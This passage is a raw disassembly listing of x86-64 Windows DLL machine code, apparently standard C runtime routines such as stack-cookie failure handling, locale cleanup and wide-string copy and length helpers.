   180007b23:	e8 90 b1 ff ff       	call   0x180002cb8
   180007b28:	48 8b 8b 88 02 00 00 	mov    0x288(%rbx),%rcx
   180007b2f:	e8 84 b1 ff ff       	call   0x180002cb8
   180007b34:	48 8b 8b 90 02 00 00 	mov    0x290(%rbx),%rcx
   180007b3b:	e8 78 b1 ff ff       	call   0x180002cb8
   180007b40:	48 8b 8b 98 02 00 00 	mov    0x298(%rbx),%rcx
   180007b47:	e8 6c b1 ff ff       	call   0x180002cb8
   180007b4c:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   180007b53:	e8 60 b1 ff ff       	call   0x180002cb8
   180007b58:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   180007b5f:	e8 54 b1 ff ff       	call   0x180002cb8
   180007b64:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   180007b6b:	e8 48 b1 ff ff       	call   0x180002cb8
   180007b70:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   180007b77:	e8 3c b1 ff ff       	call   0x180002cb8
   180007b7c:	48 83 c4 20          	add    $0x20,%rsp
   180007b80:	5b                   	pop    %rbx
   180007b81:	c3                   	ret
   180007b82:	cc                   	int3
   180007b83:	cc                   	int3
   180007b84:	48 85 c9             	test   %rcx,%rcx
   180007b87:	74 66                	je     0x180007bef
   180007b89:	53                   	push   %rbx
   180007b8a:	48 83 ec 20          	sub    $0x20,%rsp
   180007b8e:	48 8b d9             	mov    %rcx,%rbx
   180007b91:	48 8b 09             	mov    (%rcx),%rcx
   180007b94:	48 3b 0d 35 56 00 00 	cmp    0x5635(%rip),%rcx        # 0x18000d1d0
   180007b9b:	74 05                	je     0x180007ba2
   180007b9d:	e8 16 b1 ff ff       	call   0x180002cb8
   180007ba2:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   180007ba6:	48 3b 0d 2b 56 00 00 	cmp    0x562b(%rip),%rcx        # 0x18000d1d8
   180007bad:	74 05                	je     0x180007bb4
   180007baf:	e8 04 b1 ff ff       	call   0x180002cb8
   180007bb4:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   180007bb8:	48 3b 0d 21 56 00 00 	cmp    0x5621(%rip),%rcx        # 0x18000d1e0
   180007bbf:	74 05                	je     0x180007bc6
   180007bc1:	e8 f2 b0 ff ff       	call   0x180002cb8
   180007bc6:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   180007bca:	48 3b 0d 57 56 00 00 	cmp    0x5657(%rip),%rcx        # 0x18000d228
   180007bd1:	74 05                	je     0x180007bd8
   180007bd3:	e8 e0 b0 ff ff       	call   0x180002cb8
   180007bd8:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   180007bdc:	48 3b 0d 4d 56 00 00 	cmp    0x564d(%rip),%rcx        # 0x18000d230
   180007be3:	74 05                	je     0x180007bea
   180007be5:	e8 ce b0 ff ff       	call   0x180002cb8
   180007bea:	48 83 c4 20          	add    $0x20,%rsp
   180007bee:	5b                   	pop    %rbx
   180007bef:	c3                   	ret
   180007bf0:	48 85 c9             	test   %rcx,%rcx
   180007bf3:	0f 84 00 01 00 00    	je     0x180007cf9
   180007bf9:	53                   	push   %rbx
   180007bfa:	48 83 ec 20          	sub    $0x20,%rsp
   180007bfe:	48 8b d9             	mov    %rcx,%rbx
   180007c01:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   180007c05:	48 3b 0d dc 55 00 00 	cmp    0x55dc(%rip),%rcx        # 0x18000d1e8
   180007c0c:	74 05                	je     0x180007c13
   180007c0e:	e8 a5 b0 ff ff       	call   0x180002cb8
   180007c13:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   180007c17:	48 3b 0d d2 55 00 00 	cmp    0x55d2(%rip),%rcx        # 0x18000d1f0
   180007c1e:	74 05                	je     0x180007c25
   180007c20:	e8 93 b0 ff ff       	call   0x180002cb8
   180007c25:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   180007c29:	48 3b 0d c8 55 00 00 	cmp    0x55c8(%rip),%rcx        # 0x18000d1f8
   180007c30:	74 05                	je     0x180007c37
   180007c32:	e8 81 b0 ff ff       	call   0x180002cb8
   180007c37:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   180007c3b:	48 3b 0d be 55 00 00 	cmp    0x55be(%rip),%rcx        # 0x18000d200
   180007c42:	74 05                	je     0x180007c49
   180007c44:	e8 6f b0 ff ff       	call   0x180002cb8
   180007c49:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   180007c4d:	48 3b 0d b4 55 00 00 	cmp    0x55b4(%rip),%rcx        # 0x18000d208
   180007c54:	74 05                	je     0x180007c5b
   180007c56:	e8 5d b0 ff ff       	call   0x180002cb8
   180007c5b:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   180007c5f:	48 3b 0d aa 55 00 00 	cmp    0x55aa(%rip),%rcx        # 0x18000d210
   180007c66:	74 05                	je     0x180007c6d
   180007c68:	e8 4b b0 ff ff       	call   0x180002cb8
   180007c6d:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   180007c71:	48 3b 0d a0 55 00 00 	cmp    0x55a0(%rip),%rcx        # 0x18000d218
   180007c78:	74 05                	je     0x180007c7f
   180007c7a:	e8 39 b0 ff ff       	call   0x180002cb8
   180007c7f:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   180007c83:	48 3b 0d ae 55 00 00 	cmp    0x55ae(%rip),%rcx        # 0x18000d238
   180007c8a:	74 05                	je     0x180007c91
   180007c8c:	e8 27 b0 ff ff       	call   0x180002cb8
   180007c91:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   180007c95:	48 3b 0d a4 55 00 00 	cmp    0x55a4(%rip),%rcx        # 0x18000d240
   180007c9c:	74 05                	je     0x180007ca3
   180007c9e:	e8 15 b0 ff ff       	call   0x180002cb8
   180007ca3:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   180007ca7:	48 3b 0d 9a 55 00 00 	cmp    0x559a(%rip),%rcx        # 0x18000d248
   180007cae:	74 05                	je     0x180007cb5
   180007cb0:	e8 03 b0 ff ff       	call   0x180002cb8
   180007cb5:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   180007cbc:	48 3b 0d 8d 55 00 00 	cmp    0x558d(%rip),%rcx        # 0x18000d250
   180007cc3:	74 05                	je     0x180007cca
   180007cc5:	e8 ee af ff ff       	call   0x180002cb8
   180007cca:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   180007cd1:	48 3b 0d 80 55 00 00 	cmp    0x5580(%rip),%rcx        # 0x18000d258
   180007cd8:	74 05                	je     0x180007cdf
   180007cda:	e8 d9 af ff ff       	call   0x180002cb8
   180007cdf:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   180007ce6:	48 3b 0d 73 55 00 00 	cmp    0x5573(%rip),%rcx        # 0x18000d260
   180007ced:	74 05                	je     0x180007cf4
   180007cef:	e8 c4 af ff ff       	call   0x180002cb8
   180007cf4:	48 83 c4 20          	add    $0x20,%rsp
   180007cf8:	5b                   	pop    %rbx
   180007cf9:	c3                   	ret
   180007cfa:	cc                   	int3
   180007cfb:	cc                   	int3
   180007cfc:	b9 02 00 00 00       	mov    $0x2,%ecx
   180007d01:	e9 fa b4 ff ff       	jmp    0x180003200
   180007d06:	cc                   	int3
   180007d07:	cc                   	int3
   180007d08:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180007d0d:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   180007d14:	48 8d 0d c5 61 00 00 	lea    0x61c5(%rip),%rcx        # 0x18000dee0
   180007d1b:	ff 15 67 13 00 00    	call   *0x1367(%rip)        # 0x180009088
   180007d21:	48 8b 05 b0 62 00 00 	mov    0x62b0(%rip),%rax        # 0x18000dfd8
   180007d28:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180007d2d:	45 33 c0             	xor    %r8d,%r8d
   180007d30:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180007d35:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180007d3a:	e8 fd 0b 00 00       	call   0x18000893c
   180007d3f:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180007d44:	48 83 7c 24 50 00    	cmpq   $0x0,0x50(%rsp)
   180007d4a:	74 41                	je     0x180007d8d
   180007d4c:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   180007d53:	00 00 
   180007d55:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   180007d5a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180007d5f:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   180007d64:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180007d69:	48 8d 05 70 61 00 00 	lea    0x6170(%rip),%rax        # 0x18000dee0
   180007d70:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180007d75:	4c 8b 4c 24 50       	mov    0x50(%rsp),%r9
   180007d7a:	4c 8b 44 24 58       	mov    0x58(%rsp),%r8
   180007d7f:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180007d84:	33 c9                	xor    %ecx,%ecx
   180007d86:	e8 ab 0b 00 00       	call   0x180008936
   180007d8b:	eb 22                	jmp    0x180007daf
   180007d8d:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   180007d94:	00 
   180007d95:	48 89 05 3c 62 00 00 	mov    %rax,0x623c(%rip)        # 0x18000dfd8
   180007d9c:	48 8d 84 24 88 00 00 	lea    0x88(%rsp),%rax
   180007da3:	00 
   180007da4:	48 83 c0 08          	add    $0x8,%rax
   180007da8:	48 89 05 c9 61 00 00 	mov    %rax,0x61c9(%rip)        # 0x18000df78
   180007daf:	48 8b 05 22 62 00 00 	mov    0x6222(%rip),%rax        # 0x18000dfd8
   180007db6:	48 89 05 93 60 00 00 	mov    %rax,0x6093(%rip)        # 0x18000de50
   180007dbd:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   180007dc4:	00 
   180007dc5:	48 89 05 94 61 00 00 	mov    %rax,0x6194(%rip)        # 0x18000df60
   180007dcc:	c7 05 6a 60 00 00 09 	movl   $0xc0000409,0x606a(%rip)        # 0x18000de40
   180007dd3:	04 00 c0 
   180007dd6:	c7 05 64 60 00 00 01 	movl   $0x1,0x6064(%rip)        # 0x18000de44
   180007ddd:	00 00 00 
   180007de0:	48 8b 05 89 51 00 00 	mov    0x5189(%rip),%rax        # 0x18000cf70
   180007de7:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   180007dec:	48 8b 05 85 51 00 00 	mov    0x5185(%rip),%rax        # 0x18000cf78
   180007df3:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   180007df8:	ff 15 72 12 00 00    	call   *0x1272(%rip)        # 0x180009070
   180007dfe:	89 05 d4 60 00 00    	mov    %eax,0x60d4(%rip)        # 0x18000ded8
   180007e04:	b9 01 00 00 00       	mov    $0x1,%ecx
   180007e09:	e8 72 dc ff ff       	call   0x180005a80
   180007e0e:	33 c9                	xor    %ecx,%ecx
   180007e10:	ff 15 52 12 00 00    	call   *0x1252(%rip)        # 0x180009068
   180007e16:	48 8d 0d 63 2d 00 00 	lea    0x2d63(%rip),%rcx        # 0x18000ab80
   180007e1d:	ff 15 3d 12 00 00    	call   *0x123d(%rip)        # 0x180009060
   180007e23:	83 3d ae 60 00 00 00 	cmpl   $0x0,0x60ae(%rip)        # 0x18000ded8
   180007e2a:	75 0a                	jne    0x180007e36
   180007e2c:	b9 01 00 00 00       	mov    $0x1,%ecx
   180007e31:	e8 4a dc ff ff       	call   0x180005a80
   180007e36:	ff 15 64 12 00 00    	call   *0x1264(%rip)        # 0x1800090a0
   180007e3c:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   180007e41:	48 8b c8             	mov    %rax,%rcx
   180007e44:	ff 15 4e 12 00 00    	call   *0x124e(%rip)        # 0x180009098
   180007e4a:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   180007e51:	c3                   	ret
   180007e52:	cc                   	int3
   180007e53:	cc                   	int3
   180007e54:	48 83 ec 28          	sub    $0x28,%rsp
   180007e58:	48 85 c9             	test   %rcx,%rcx
   180007e5b:	75 19                	jne    0x180007e76
   180007e5d:	e8 3e a8 ff ff       	call   0x1800026a0
   180007e62:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180007e68:	e8 cb a7 ff ff       	call   0x180002638
   180007e6d:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180007e71:	48 83 c4 28          	add    $0x28,%rsp
   180007e75:	c3                   	ret
   180007e76:	4c 8b c1             	mov    %rcx,%r8
   180007e79:	48 8b 0d c8 56 00 00 	mov    0x56c8(%rip),%rcx        # 0x18000d548
   180007e80:	33 d2                	xor    %edx,%edx
   180007e82:	48 83 c4 28          	add    $0x28,%rsp
   180007e86:	48 ff 25 93 13 00 00 	rex.W jmp *0x1393(%rip)        # 0x180009220
   180007e8d:	cc                   	int3
   180007e8e:	cc                   	int3
   180007e8f:	cc                   	int3
   180007e90:	48 83 ec 28          	sub    $0x28,%rsp
   180007e94:	e8 17 e2 ff ff       	call   0x1800060b0
   180007e99:	48 85 c0             	test   %rax,%rax
   180007e9c:	74 0a                	je     0x180007ea8
   180007e9e:	b9 16 00 00 00       	mov    $0x16,%ecx
   180007ea3:	e8 18 e2 ff ff       	call   0x1800060c0
   180007ea8:	f6 05 c9 53 00 00 02 	testb  $0x2,0x53c9(%rip)        # 0x18000d278
   180007eaf:	74 14                	je     0x180007ec5
   180007eb1:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180007eb7:	ba 15 00 00 40       	mov    $0x40000015,%edx
   180007ebc:	41 8d 48 02          	lea    0x2(%r8),%ecx
   180007ec0:	e8 83 a5 ff ff       	call   0x180002448
   180007ec5:	b9 03 00 00 00       	mov    $0x3,%ecx
   180007eca:	e8 15 b3 ff ff       	call   0x1800031e4
   180007ecf:	cc                   	int3
   180007ed0:	40 53                	rex push %rbx
   180007ed2:	55                   	push   %rbp
   180007ed3:	56                   	push   %rsi
   180007ed4:	57                   	push   %rdi
   180007ed5:	41 54                	push   %r12
   180007ed7:	41 55                	push   %r13
   180007ed9:	41 56                	push   %r14
   180007edb:	48 83 ec 50          	sub    $0x50,%rsp
   180007edf:	48 8b 05 8a 50 00 00 	mov    0x508a(%rip),%rax        # 0x18000cf70
   180007ee6:	48 33 c4             	xor    %rsp,%rax
   180007ee9:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180007eee:	41 8b e8             	mov    %r8d,%ebp
   180007ef1:	4c 8b f2             	mov    %rdx,%r14
   180007ef4:	4c 8b e9             	mov    %rcx,%r13
   180007ef7:	e8 2c aa ff ff       	call   0x180002928
   180007efc:	33 db                	xor    %ebx,%ebx
   180007efe:	48 39 1d b3 64 00 00 	cmp    %rbx,0x64b3(%rip)        # 0x18000e3b8
   180007f05:	48 8b f8             	mov    %rax,%rdi
   180007f08:	0f 85 d5 00 00 00    	jne    0x180007fe3
   180007f0e:	48 8d 0d eb 2c 00 00 	lea    0x2ceb(%rip),%rcx        # 0x18000ac00
   180007f15:	ff 15 cd 12 00 00    	call   *0x12cd(%rip)        # 0x1800091e8
   180007f1b:	48 8b f0             	mov    %rax,%rsi
   180007f1e:	48 85 c0             	test   %rax,%rax
   180007f21:	0f 84 93 01 00 00    	je     0x1800080ba
   180007f27:	48 8d 15 c2 2c 00 00 	lea    0x2cc2(%rip),%rdx        # 0x18000abf0
   180007f2e:	48 8b c8             	mov    %rax,%rcx
   180007f31:	ff 15 b1 11 00 00    	call   *0x11b1(%rip)        # 0x1800090e8
   180007f37:	48 85 c0             	test   %rax,%rax
   180007f3a:	0f 84 7a 01 00 00    	je     0x1800080ba
   180007f40:	48 8b c8             	mov    %rax,%rcx
   180007f43:	ff 15 47 11 00 00    	call   *0x1147(%rip)        # 0x180009090
   180007f49:	48 8d 15 90 2c 00 00 	lea    0x2c90(%rip),%rdx        # 0x18000abe0
   180007f50:	48 8b ce             	mov    %rsi,%rcx
   180007f53:	48 89 05 5e 64 00 00 	mov    %rax,0x645e(%rip)        # 0x18000e3b8
   180007f5a:	ff 15 88 11 00 00    	call   *0x1188(%rip)        # 0x1800090e8
   180007f60:	48 8b c8             	mov    %rax,%rcx
   180007f63:	ff 15 27 11 00 00    	call   *0x1127(%rip)        # 0x180009090
   180007f69:	48 8d 15 58 2c 00 00 	lea    0x2c58(%rip),%rdx        # 0x18000abc8
   180007f70:	48 8b ce             	mov    %rsi,%rcx
   180007f73:	48 89 05 46 64 00 00 	mov    %rax,0x6446(%rip)        # 0x18000e3c0
   180007f7a:	ff 15 68 11 00 00    	call   *0x1168(%rip)        # 0x1800090e8
   180007f80:	48 8b c8             	mov    %rax,%rcx
   180007f83:	ff 15 07 11 00 00    	call   *0x1107(%rip)        # 0x180009090
   180007f89:	48 8d 15 18 2c 00 00 	lea    0x2c18(%rip),%rdx        # 0x18000aba8
   180007f90:	48 8b ce             	mov    %rsi,%rcx
   180007f93:	48 89 05 2e 64 00 00 	mov    %rax,0x642e(%rip)        # 0x18000e3c8
   180007f9a:	ff 15 48 11 00 00    	call   *0x1148(%rip)        # 0x1800090e8
   180007fa0:	48 8b c8             	mov    %rax,%rcx
   180007fa3:	ff 15 e7 10 00 00    	call   *0x10e7(%rip)        # 0x180009090
   180007fa9:	4c 8b d8             	mov    %rax,%r11
   180007fac:	48 89 05 25 64 00 00 	mov    %rax,0x6425(%rip)        # 0x18000e3d8
   180007fb3:	48 85 c0             	test   %rax,%rax
   180007fb6:	74 22                	je     0x180007fda
   180007fb8:	48 8d 15 d1 2b 00 00 	lea    0x2bd1(%rip),%rdx        # 0x18000ab90
   180007fbf:	48 8b ce             	mov    %rsi,%rcx
   180007fc2:	ff 15 20 11 00 00    	call   *0x1120(%rip)        # 0x1800090e8
   180007fc8:	48 8b c8             	mov    %rax,%rcx
   180007fcb:	ff 15 bf 10 00 00    	call   *0x10bf(%rip)        # 0x180009090
   180007fd1:	48 89 05 f8 63 00 00 	mov    %rax,0x63f8(%rip)        # 0x18000e3d0
   180007fd8:	eb 10                	jmp    0x180007fea
   180007fda:	48 8b 05 ef 63 00 00 	mov    0x63ef(%rip),%rax        # 0x18000e3d0
   180007fe1:	eb 0e                	jmp    0x180007ff1
   180007fe3:	48 8b 05 e6 63 00 00 	mov    0x63e6(%rip),%rax        # 0x18000e3d0
   180007fea:	4c 8b 1d e7 63 00 00 	mov    0x63e7(%rip),%r11        # 0x18000e3d8
   180007ff1:	48 3b c7             	cmp    %rdi,%rax
   180007ff4:	74 62                	je     0x180008058
   180007ff6:	4c 3b df             	cmp    %rdi,%r11
   180007ff9:	74 5d                	je     0x180008058
   180007ffb:	48 8b c8             	mov    %rax,%rcx
   180007ffe:	ff 15 54 10 00 00    	call   *0x1054(%rip)        # 0x180009058
   180008004:	48 8b 0d cd 63 00 00 	mov    0x63cd(%rip),%rcx        # 0x18000e3d8
   18000800b:	48 8b f0             	mov    %rax,%rsi
   18000800e:	ff 15 44 10 00 00    	call   *0x1044(%rip)        # 0x180009058
   180008014:	4c 8b e0             	mov    %rax,%r12
   180008017:	48 85 f6             	test   %rsi,%rsi
   18000801a:	74 3c                	je     0x180008058
   18000801c:	48 85 c0             	test   %rax,%rax
   18000801f:	74 37                	je     0x180008058
   180008021:	ff d6                	call   *%rsi
   180008023:	48 85 c0             	test   %rax,%rax
   180008026:	74 2a                	je     0x180008052
   180008028:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000802d:	41 b9 0c 00 00 00    	mov    $0xc,%r9d
   180008033:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   180008038:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000803d:	41 8d 51 f5          	lea    -0xb(%r9),%edx
   180008041:	48 8b c8             	mov    %rax,%rcx
   180008044:	41 ff d4             	call   *%r12
   180008047:	85 c0                	test   %eax,%eax
   180008049:	74 07                	je     0x180008052
   18000804b:	f6 44 24 40 01       	testb  $0x1,0x40(%rsp)
   180008050:	75 06                	jne    0x180008058
   180008052:	0f ba ed 15          	bts    $0x15,%ebp
   180008056:	eb 40                	jmp    0x180008098
   180008058:	48 8b 0d 61 63 00 00 	mov    0x6361(%rip),%rcx        # 0x18000e3c0
   18000805f:	48 3b cf             	cmp    %rdi,%rcx
   180008062:	74 34                	je     0x180008098
   180008064:	ff 15 ee 0f 00 00    	call   *0xfee(%rip)        # 0x180009058
   18000806a:	48 85 c0             	test   %rax,%rax
   18000806d:	74 29                	je     0x180008098
   18000806f:	ff d0                	call   *%rax
   180008071:	48 8b d8             	mov    %rax,%rbx
   180008074:	48 85 c0             	test   %rax,%rax
   180008077:	74 1f                	je     0x180008098
   180008079:	48 8b 0d 48 63 00 00 	mov    0x6348(%rip),%rcx        # 0x18000e3c8
   180008080:	48 3b cf             	cmp    %rdi,%rcx
   180008083:	74 13                	je     0x180008098
   180008085:	ff 15 cd 0f 00 00    	call   *0xfcd(%rip)        # 0x180009058
   18000808b:	48 85 c0             	test   %rax,%rax
   18000808e:	74 08                	je     0x180008098
   180008090:	48 8b cb             	mov    %rbx,%rcx
   180008093:	ff d0                	call   *%rax
   180008095:	48 8b d8             	mov    %rax,%rbx
   180008098:	48 8b 0d 19 63 00 00 	mov    0x6319(%rip),%rcx        # 0x18000e3b8
   18000809f:	ff 15 b3 0f 00 00    	call   *0xfb3(%rip)        # 0x180009058
   1800080a5:	48 85 c0             	test   %rax,%rax
   1800080a8:	74 10                	je     0x1800080ba
   1800080aa:	44 8b cd             	mov    %ebp,%r9d
   1800080ad:	4d 8b c6             	mov    %r14,%r8
   1800080b0:	49 8b d5             	mov    %r13,%rdx
   1800080b3:	48 8b cb             	mov    %rbx,%rcx
   1800080b6:	ff d0                	call   *%rax
   1800080b8:	eb 02                	jmp    0x1800080bc
   1800080ba:	33 c0                	xor    %eax,%eax
   1800080bc:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1800080c1:	48 33 cc             	xor    %rsp,%rcx
   1800080c4:	e8 97 d9 ff ff       	call   0x180005a60
   1800080c9:	48 83 c4 50          	add    $0x50,%rsp
   1800080cd:	41 5e                	pop    %r14
   1800080cf:	41 5d                	pop    %r13
   1800080d1:	41 5c                	pop    %r12
   1800080d3:	5f                   	pop    %rdi
   1800080d4:	5e                   	pop    %rsi
   1800080d5:	5d                   	pop    %rbp
   1800080d6:	5b                   	pop    %rbx
   1800080d7:	c3                   	ret
   1800080d8:	40 53                	rex push %rbx
   1800080da:	48 83 ec 20          	sub    $0x20,%rsp
   1800080de:	45 33 d2             	xor    %r10d,%r10d
   1800080e1:	4c 8b c9             	mov    %rcx,%r9
   1800080e4:	48 85 c9             	test   %rcx,%rcx
   1800080e7:	74 0e                	je     0x1800080f7
   1800080e9:	48 85 d2             	test   %rdx,%rdx
   1800080ec:	74 09                	je     0x1800080f7
   1800080ee:	4d 85 c0             	test   %r8,%r8
   1800080f1:	75 1d                	jne    0x180008110
   1800080f3:	66 44 89 11          	mov    %r10w,(%rcx)
   1800080f7:	e8 a4 a5 ff ff       	call   0x1800026a0
   1800080fc:	bb 16 00 00 00       	mov    $0x16,%ebx
   180008101:	89 18                	mov    %ebx,(%rax)
   180008103:	e8 30 a5 ff ff       	call   0x180002638
   180008108:	8b c3                	mov    %ebx,%eax
   18000810a:	48 83 c4 20          	add    $0x20,%rsp
   18000810e:	5b                   	pop    %rbx
   18000810f:	c3                   	ret
   180008110:	66 44 39 11          	cmp    %r10w,(%rcx)
   180008114:	74 09                	je     0x18000811f
   180008116:	48 83 c1 02          	add    $0x2,%rcx
   18000811a:	48 ff ca             	dec    %rdx
   18000811d:	75 f1                	jne    0x180008110
   18000811f:	48 85 d2             	test   %rdx,%rdx
   180008122:	75 06                	jne    0x18000812a
   180008124:	66 45 89 11          	mov    %r10w,(%r9)
   180008128:	eb cd                	jmp    0x1800080f7
   18000812a:	49 2b c8             	sub    %r8,%rcx
   18000812d:	41 0f b7 00          	movzwl (%r8),%eax
   180008131:	66 42 89 04 01       	mov    %ax,(%rcx,%r8,1)
   180008136:	49 83 c0 02          	add    $0x2,%r8
   18000813a:	66 85 c0             	test   %ax,%ax
   18000813d:	74 05                	je     0x180008144
   18000813f:	48 ff ca             	dec    %rdx
   180008142:	75 e9                	jne    0x18000812d
   180008144:	48 85 d2             	test   %rdx,%rdx
   180008147:	75 10                	jne    0x180008159
   180008149:	66 45 89 11          	mov    %r10w,(%r9)
   18000814d:	e8 4e a5 ff ff       	call   0x1800026a0
   180008152:	bb 22 00 00 00       	mov    $0x22,%ebx
   180008157:	eb a8                	jmp    0x180008101
   180008159:	33 c0                	xor    %eax,%eax
   18000815b:	eb ad                	jmp    0x18000810a
   18000815d:	cc                   	int3
   18000815e:	cc                   	int3
   18000815f:	cc                   	int3
   180008160:	40 53                	rex push %rbx
   180008162:	48 83 ec 20          	sub    $0x20,%rsp
   180008166:	33 db                	xor    %ebx,%ebx
   180008168:	4d 8b d0             	mov    %r8,%r10
   18000816b:	4d 85 c9             	test   %r9,%r9
   18000816e:	75 0e                	jne    0x18000817e
   180008170:	48 85 c9             	test   %rcx,%rcx
   180008173:	75 0e                	jne    0x180008183
   180008175:	48 85 d2             	test   %rdx,%rdx
   180008178:	75 20                	jne    0x18000819a
   18000817a:	33 c0                	xor    %eax,%eax
   18000817c:	eb 2f                	jmp    0x1800081ad
   18000817e:	48 85 c9             	test   %rcx,%rcx
   180008181:	74 17                	je     0x18000819a
   180008183:	48 85 d2             	test   %rdx,%rdx
   180008186:	74 12                	je     0x18000819a
   180008188:	4d 85 c9             	test   %r9,%r9
   18000818b:	75 05                	jne    0x180008192
   18000818d:	66 89 19             	mov    %bx,(%rcx)
   180008190:	eb e8                	jmp    0x18000817a
   180008192:	4d 85 c0             	test   %r8,%r8
   180008195:	75 1c                	jne    0x1800081b3
   180008197:	66 89 19             	mov    %bx,(%rcx)
   18000819a:	e8 01 a5 ff ff       	call   0x1800026a0
   18000819f:	bb 16 00 00 00       	mov    $0x16,%ebx
   1800081a4:	89 18                	mov    %ebx,(%rax)
   1800081a6:	e8 8d a4 ff ff       	call   0x180002638
   1800081ab:	8b c3                	mov    %ebx,%eax
   1800081ad:	48 83 c4 20          	add    $0x20,%rsp
   1800081b1:	5b                   	pop    %rbx
   1800081b2:	c3                   	ret
   1800081b3:	4c 8b d9             	mov    %rcx,%r11
   1800081b6:	4c 8b c2             	mov    %rdx,%r8
   1800081b9:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   1800081bd:	75 1c                	jne    0x1800081db
   1800081bf:	4d 2b da             	sub    %r10,%r11
   1800081c2:	41 0f b7 02          	movzwl (%r10),%eax
   1800081c6:	66 43 89 04 13       	mov    %ax,(%r11,%r10,1)
   1800081cb:	49 83 c2 02          	add    $0x2,%r10
   1800081cf:	66 85 c0             	test   %ax,%ax
   1800081d2:	74 2f                	je     0x180008203
   1800081d4:	49 ff c8             	dec    %r8
   1800081d7:	75 e9                	jne    0x1800081c2
   1800081d9:	eb 28                	jmp    0x180008203
   1800081db:	4c 2b d1             	sub    %rcx,%r10
   1800081de:	43 0f b7 04 1a       	movzwl (%r10,%r11,1),%eax
   1800081e3:	66 41 89 03          	mov    %ax,(%r11)
   1800081e7:	49 83 c3 02          	add    $0x2,%r11
   1800081eb:	66 85 c0             	test   %ax,%ax
   1800081ee:	74 0a                	je     0x1800081fa
   1800081f0:	49 ff c8             	dec    %r8
   1800081f3:	74 05                	je     0x1800081fa
   1800081f5:	49 ff c9             	dec    %r9
   1800081f8:	75 e4                	jne    0x1800081de
   1800081fa:	4d 85 c9             	test   %r9,%r9
   1800081fd:	75 04                	jne    0x180008203
   1800081ff:	66 41 89 1b          	mov    %bx,(%r11)
   180008203:	4d 85 c0             	test   %r8,%r8
   180008206:	0f 85 6e ff ff ff    	jne    0x18000817a
   18000820c:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   180008210:	75 0b                	jne    0x18000821d
   180008212:	66 89 5c 51 fe       	mov    %bx,-0x2(%rcx,%rdx,2)
   180008217:	41 8d 40 50          	lea    0x50(%r8),%eax
   18000821b:	eb 90                	jmp    0x1800081ad
   18000821d:	66 89 19             	mov    %bx,(%rcx)
   180008220:	e8 7b a4 ff ff       	call   0x1800026a0
   180008225:	bb 22 00 00 00       	mov    $0x22,%ebx
   18000822a:	e9 75 ff ff ff       	jmp    0x1800081a4
   18000822f:	cc                   	int3
   180008230:	48 8b c1             	mov    %rcx,%rax
   180008233:	0f b7 10             	movzwl (%rax),%edx
   180008236:	48 83 c0 02          	add    $0x2,%rax
   18000823a:	66 85 d2             	test   %dx,%dx
   18000823d:	75 f4                	jne    0x180008233
   18000823f:	48 2b c1             	sub    %rcx,%rax
   180008242:	48 d1 f8             	sar    $1,%rax
   180008245:	48 ff c8             	dec    %rax
   180008248:	c3                   	ret
   180008249:	cc                   	int3
   18000824a:	cc                   	int3
   18000824b:	cc                   	int3
   18000824c:	40 53                	rex push %rbx
   18000824e:	48 83 ec 20          	sub    $0x20,%rsp
   180008252:	45 33 d2             	xor    %r10d,%r10d
   180008255:	4c 8b c9             	mov    %rcx,%r9
   180008258:	48 85 c9             	test   %rcx,%rcx
   18000825b:	74 0e                	je     0x18000826b
   18000825d:	48 85 d2             	test   %rdx,%rdx
   180008260:	74 09                	je     0x18000826b
   180008262:	4d 85 c0             	test   %r8,%r8
   180008265:	75 1d                	jne    0x180008284
   180008267:	66 44 89 11          	mov    %r10w,(%rcx)
   18000826b:	e8 30 a4 ff ff       	call   0x1800026a0
   180008270:	bb 16 00 00 00       	mov    $0x16,%ebx
